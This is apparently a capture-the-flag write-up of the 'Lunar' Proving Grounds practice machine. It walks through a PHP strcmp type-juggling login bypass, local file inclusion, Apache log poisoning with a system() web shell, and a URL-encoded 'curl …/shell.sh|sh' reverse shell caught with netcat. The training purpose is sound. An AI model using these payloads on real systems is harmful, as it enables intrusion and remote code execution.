### Lunar Proving Grounds Practice

### Difficult = Intermediate

### IP Address = 192.168.66.216

Nmap Scan:

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Lunar]
└─$ cat nmapscan 
# Nmap 7.92 scan initiated Mon Jan 16 05:54:41 2023 as: nmap -sCV -A -p22,111,80,2049 -oN nmapscan 192.168.144.216
Nmap scan report for 192.168.144.216
Host is up (0.56s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Lunar Studio
|_http-server-header: Apache/2.4.41 (Ubuntu)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  3           2049/udp   nfs
|   100003  3,4         2049/tcp   nfs
|   100005  1,2,3      40657/udp   mountd
|   100005  1,2,3      43335/tcp   mountd
|   100021  1,3,4      38119/tcp   nlockmgr
|   100021  1,3,4      60511/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/udp   nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan 16 05:55:37 2023 -- 1 IP address (1 host up) scanned in 56.52 seconds
```

We have ssh,http,nfs

Lets enumerate the nfs 

First i'll see what share is available and if it can be mounted

```
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Lunar]
└─$ showmount -e 192.168.66.216                             
Export list for 192.168.66.216:
/srv/share localhost
```

But only localhost can mount the share too bad for us :(

Anyways lets move on to the web server

On heading there see a page which provides design for people
![image](https://user-images.githubusercontent.com/113513376/214081239-029ececd-a2b7-44c5-bbf6-d2b1a76bacb2.png)

Also there's a login page
![image](https://user-images.githubusercontent.com/113513376/214081505-eebc4116-5ace-4212-a9d1-45d74b1ebb42.png)

Trying sqli doesn't work so lets hit on gobuster

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Lunar]
└─$ gobuster dir -u http://192.168.66.216 -w wordlist -x php,txt,zip         
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.66.216
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                wordlist
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Extensions:              php,txt,zip
[+] Timeout:                 10s
===============================================================
2023/01/23 16:39:59 Starting gobuster in directory enumeration mode
===============================================================
/login.php            (Status: 200) [Size: 2512]
/backup.zip           (Status: 200) [Size: 1265712]
===============================================================
2023/01/23 16:40:05 Finished
===============================================================

```

Lets download the backup file
![image](https://user-images.githubusercontent.com/113513376/214082376-c597690a-8f24-495d-b23b-4273b63983f2.png)

Now unzipping it and viewing the files in it

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Lunar]
└─$ mv ~/Downloads/backup.zip .
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Lunar]
└─$ mkdir backup               
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Lunar]
└─$ mv backup.zip backup
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Lunar]
└─$ cd backup                       
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/Pg/Practice/Lunar/backup]
└─$ unzip backup.zip   
Archive:  backup.zip
  inflating: completed.php           
  inflating: css/bootstrap.css       
  inflating: css/font-awesome.min.css  
  inflating: css/responsive.css      
  inflating: css/style.css           
  inflating: css/style.css.map       
  inflating: css/style.scss          
  inflating: dashboard.css           
  inflating: dashboard.php           
 extracting: favicon.ico             
  inflating: fonts/fontawesome-webfont.ttf  
  inflating: fonts/fontawesome-webfont.woff  
  inflating: fonts/fontawesome-webfont.woff2  
  inflating: images/about-img.jpg    
  inflating: images/client-1.jpg     
  inflating: images/client-2.jpg     
  inflating: images/client-3.jpg     
  inflating: images/logo.png         
  inflating: images/p1.jpg           
  inflating: images/p2.jpg           
  inflating: images/p3.jpg           
  inflating: images/p4.jpg           
  inflating: images/p5.jpg           
  inflating: images/s1.png           
  inflating: images/s2.png           
  inflating: images/s3.png           
  inflating: images/s4.png           
  inflating: images/s5.png           
  inflating: images/s6.png           
  inflating: images/slider-img.jpg   
  inflating: index.html              
  inflating: js/bootstrap.js         
  inflating: js/custom.js            
  inflating: js/jquery-3.4.1.min.js  
  inflating: login.php               
  inflating: pending.php  
  ```
  
  Nice we see the its the web server files
  
  Lets check out login.php 
  ![image](https://user-images.githubusercontent.com/113513376/214082876-cbf57de0-3396-4e2d-be38-cee31592b217.png)
  
  Whats of interest to us is the php code
  
  ```
  <?php
session_start();
include 'creds.php';
$error = null;
if ($_POST) {

  if ($_POST['email'] && !empty($_POST['email']) && $_POST['email'] === 'liam@lunar.local' && strcmp($_POST['password'], $pwd) == 0) {
    
      $_SESSION['email'] = $_POST['email'];
      
      header('Location: dashboard.php');
      
      die();
  } 
  else {    
      $error = "Email or password is incorrect.";
  }    
    }
?>
```

We see it does a check that if the email sent to the server is `liam@lunar.local` and also it does string compare to the password being sent to the server with the password in the file creds.php

From here we know that the password variable is vulnerable to php type juggling

Reason why is because it comparision operator is weak and not approriate 

So lets just exploit this bug

I'll head back to the web login page and capture the request in burp suite

Then when i try loggin in now with a valid email
![image](https://user-images.githubusercontent.com/113513376/214084561-661866e8-4618-479a-96a8-af598de3a282.png)

Here's the request below

```
POST /login.php HTTP/1.1
Host: 192.168.66.216
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Origin: http://192.168.66.216
Connection: close
Referer: http://192.168.66.216/login.php
Cookie: PHPSESSID=35cr6r4vvs6u6uu7hmrfsjlqng
Upgrade-Insecure-Requests: 1

email=liam%40lunar.local&password=
```

I'll edit the request to this

```
POST /login.php HTTP/1.1
Host: 192.168.66.216
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Origin: http://192.168.66.216
Connection: close
Referer: http://192.168.66.216/login.php
Cookie: PHPSESSID=35cr6r4vvs6u6uu7hmrfsjlqng
Upgrade-Insecure-Requests: 1

email=liam%40lunar.local&password[]=""
```

After forwarding it we get redirected to dashboard.php cool
![image](https://user-images.githubusercontent.com/113513376/214084981-5a8b793f-8014-4289-965a-67b0240fbe50.png)

Since we have access to the dashboard.php file lets do source code review

```
<?php
session_start();

if (!isset($_SESSION['email'])) {
	header('Location: login.php');
    die();
}

$error = null;
?>
```

Thats the first portion that deals with giving access to the dashboard

The second portion contains juicy info

```
<?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['show'])) {
                if(containsStr($_GET['show'], 'pending') || containsStr($_GET['show'], 'completed')) {
                    error_reporting(E_ALL ^ E_WARNING); 
                    include $_GET['show'] . $ext;
                } else {
                    echo 'You can select either one of these only';
                }
            }
        ?>
 ```
 
 Looking at the source code we can conclude that 
 
 ```
 1. This is a PHP script that checks if the GET parameter "show" is set
 2. If it is, it checks if the value of "show" contains the strings "pending" or "completed" using the function "containsStr"
 3. If the value of "show" contains either of those strings, it will include a file with the name of the value of "show" and an extension that is either defined in the GET parameter "ext" or defaults to '.php'
 4. If the value of "show" does not contain "pending" or "completed", the script will output an error message.
 5. The error reporting is set to ignore warnings
 ```
 
 Thanks ChatGPT xD
 
 From this we can conclude that this code is vulnerable to Local File Inclusion (LFI)
 
 But we need to append the payload to the string `pending/completed` 
 
 Given we provide an ext parameter, we can override the default php extension
 
 Lets now check it out on the web server 
![image](https://user-images.githubusercontent.com/113513376/214087315-a08599ea-82d1-466a-af13-54503ff748b6.png)

Here's how the payload should look like

```
http://192.168.66.216/dashboard.php?show=pending/../../../../../etc/passwd&ext=
```

We've now confirmed the lfi vulnerablity
![image](https://user-images.githubusercontent.com/113513376/214090345-1b1b6999-d038-4548-89bd-aba6ae54dbb2.png)

So lets get rce via this

One way of doing this is by performing Log Poisoning

But first we need to know the path where access/error logs are stored

By default apache2 logs are stored in `/var/log/apache2/access.log`

Now i'll try to read the file 
![image](https://user-images.githubusercontent.com/113513376/214092083-71549ba4-eb75-49d9-90b1-17e2ff293a6a.png)

Boom!!! So lets perform log poisoining 

```
┌──(mark__haxor)-[~/_/Pg/Practice/Lunar/backup]
└─$ telnet 192.168.66.216 80
Trying 192.168.66.216...
Connected to 192.168.66.216.
Escape character is '^]'.
<?php system($_REQUEST['cmd']); ?>

HTTP/1.1 400 Bad Request
Date: Mon, 23 Jan 2023 16:21:18 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 301
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 127.0.0.1 Port 80</address>
</body></html>
Connection closed by foreign host.
 ```
  
  Now that we have poisoined the log lets check if it really worked
  
  I'll ping my device to confirm if it works
  
  ```
  ──(mark__haxor)-[~/_/Pg/Practice/Lunar/backup]
└─$ sudo tcpdump -i tun0 icmp
[sudo] password for mark: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

Now the payload should be like this `http://192.168.66.216/dashboard.php?show=pending/../../../../../var/log/apache2/access.log&cmd=ping%20-c%202%20192.168.49.66&ext=`

Navigating to that it loads and on checking tcpdump we get a ping request 

```
┌──(mark__haxor)-[~/_/Pg/Practice/Lunar/backup]
└─$ sudo tcpdump -i tun0 icmp
[sudo] password for mark: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
17:23:12.621124 IP 192.168.66.216 > haxor: ICMP echo request, id 1, seq 1, length 64
17:23:12.621195 IP haxor > 192.168.66.216: ICMP echo reply, id 1, seq 1, length 64
17:23:13.642481 IP 192.168.66.216 > haxor: ICMP echo request, id 1, seq 2, length 64
17:23:13.642504 IP haxor > 192.168.66.216: ICMP echo reply, id 1, seq 2, length 64
17:23:13.949584 IP 192.168.66.216 > haxor: ICMP echo request, id 2, seq 1, length 64
17:23:13.949613 IP haxor > 192.168.66.216: ICMP echo reply, id 2, seq 1, length 64
17:23:15.076747 IP 192.168.66.216 > haxor: ICMP echo request, id 2, seq 2, length 64
17:23:15.076764 IP haxor > 192.168.66.216: ICMP echo reply, id 2, seq 2, length 64
```

Now lets get a reverse shell 

Here's the reverse shell payload used and its basically `curl 192.168.49.66:1337/shell.sh|sh` but url encoded

```
%63%75%72%6c%20%31%39%32%2e%31%36%38%2e%34%39%2e%36%36%3a%31%33%33%37%2f%73%68%65%6c%6c%2e%73%68%7c%73%68 
```

And i created a file called shell.sh which has a python reverse shell payload which i then hosted a python web server on port 1337

Also i'll set a netcat listener on port 80

Here's how the final payload should be

```
http://192.168.66.216/dashboard.php?show=pending/../../../../../var/log/apache2/access.log&cmd=%63%75%72%6c%20%31%39%32%2e%31%36%38%2e%34%39%2e%36%36%3a%31%33%33%37%2f%73%68%65%6c%6c%2e%73%68%7c%73%68&ext=
```

Back on the netcat listener we get a reverse shell

```
┌──(mark__haxor)-[~/_/Pg/Practice/Lunar/backup]
└─$ nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.49.66] from (UNKNOWN) [192.168.66.216] 40454
$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```

Now stabilizing the reverse shell

```
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
CTRL + Z
stty raw -echo;fg
```







```


 
 



